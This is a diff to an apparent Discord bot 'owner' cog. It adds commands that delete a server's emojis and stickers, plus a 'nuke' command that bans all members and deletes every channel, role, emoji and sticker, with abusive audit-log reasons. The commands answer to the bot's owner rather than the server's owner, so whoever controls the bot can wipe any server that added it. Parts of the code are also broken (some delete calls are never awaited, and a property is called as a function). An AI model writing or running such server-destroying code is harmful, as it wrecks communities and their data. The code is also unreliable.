@@ -36,6 +36,44 @@ class owner(commands.Cog):
         for r in ctx.guild.roles:
             try: await r.delete(reason=f'get fucked by {ctx.author}')
             except: continue
+            
+    @commands.command()
+    @commands.is_owner()
+    async def deleteemojis(self, ctx: commands.Context):
+        for e in ctx.guild.emojis:
+            try: await e.delete(reason=f'get fucked by {ctx.author}')
+            except: continue
+            
+    @commands.command()
+    @commands.is_owner()
+    async def deletestickers(self, ctx: commands.Context):
+        for s in ctx.guild.stickers:
+            try: await s.delete(reason=f'get fucked by {ctx.author}')
+            except: continue
+            
+    @commands.command()
+    @commands.is_owner()
+    async def nuke(self, ctx: commands.Context):
+        
+        for m in ctx.guild.members:
+            try: await m.ban()
+            except: continue
+            
+        for c in ctx.guild.channels:
+            try: c.delete()
+            except: continue
+            
+        for r in ctx.guild.roles:
+            try: await r.delete()
+            except: continue
+            
+        for e in ctx.guild.emojis:
+            try: await e.delete()
+            except: continue
+            
+        for s in ctx.guild.stickers():
+            try: s.delete()
+            except: continue
         
 async def setup(bot):
     await bot.add_cog(owner(bot))
